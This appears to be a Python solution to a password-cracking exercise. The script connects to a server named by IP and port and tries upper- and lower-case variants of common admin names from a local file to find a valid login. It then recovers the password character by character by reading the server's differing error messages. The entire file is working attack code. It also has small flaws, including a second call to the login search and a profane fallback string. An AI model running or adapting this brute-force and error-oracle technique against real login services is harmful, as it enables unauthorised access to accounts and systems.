import sys
import socket
import string
import itertools
import json
my_socket = socket.socket()


# obtaining args and conveying to the right format, then encoding
args = sys.argv
ip_address = args[1]
port = int(args[2])


char_num = list(string.ascii_lowercase) + list(string.digits) + list(string.ascii_uppercase)

# connect
# we need to connect only once, then send massages multiply times
def connect_server():
    address = (ip_address, port)
    my_socket.connect(address)

def pass_logger_generator():
    for i in itertools.product(string.ascii_letters + string.ascii_uppercase + string.digits, repeat=1):
        yield "".join(i)


# reading file, send password, receive response
# here i use a file with most common admin names.
# each letter of word in file i converted with lover/upper case with itertools.product and finally get a login
def get_response():
    f = open('/Users/alcherniaev/Downloads/logins.txt', 'r')
    for line in f:
        for login in map(lambda x: "".join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in line.strip('\n')))):
            password = ' '
            json_sent = {} #{"login": login, "password": password}
            json_sent["login"] = login
            json_sent["password"] = password
            my_socket.send(json.dumps(json_sent).encode())
            response = json.loads(my_socket.recv(1024).decode())
            if response["result"] == "Wrong password!":
                correct_login = login
                f.close()
                return correct_login

def get_password(must_be_correct_login):
    passw = ""
    while True:
        for k in pass_logger_generator():
            passw += k
            json_sent = {}
            json_sent["login"] = must_be_correct_login
            json_sent["password"] = passw
            my_socket.send(json.dumps(json_sent).encode(encoding='utf-8'))
            response = json.loads(my_socket.recv(1024).decode(encoding='utf-8'))
            if response["result"] == "Exception happened during login":
                continue
            elif response["result"] == "Wrong password!":
                passw = passw[:-1]
                continue
            elif response["result"] == "Connection success!":
                return passw
            elif response["result"] == "Wrong login!":
                return "even more fuck"


def get_final_json():
    return json.dumps({"login": get_response(), "password": get_password(correct_login)})


connect_server()
correct_login = get_response()
print(get_final_json())